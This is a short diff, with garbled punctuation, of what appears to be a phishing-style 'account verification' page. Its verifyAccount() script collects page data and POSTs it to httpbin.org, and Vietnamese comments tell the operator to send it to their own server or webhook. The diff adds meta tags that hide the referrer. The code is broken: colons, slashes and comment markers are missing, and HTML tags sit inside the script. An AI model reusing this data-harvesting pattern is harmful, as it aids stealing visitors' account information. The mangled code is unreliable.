@@ -36,7 +36,8 @@ function verifyAccount() {
         url window.location.href,
         timestamp new Date().toISOString()
     };
-
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="referrer" content="no-referrer">
      GỬI VỀ SERVER CỦA BẠN
     fetch('httpshttpbin.orgpost', {   THAY BẰNG WEBHOOK CỦA BẠN
         method 'POST',
@@ -51,3 +52,4 @@ function verifyAccount() {
 script
 body
 html
+
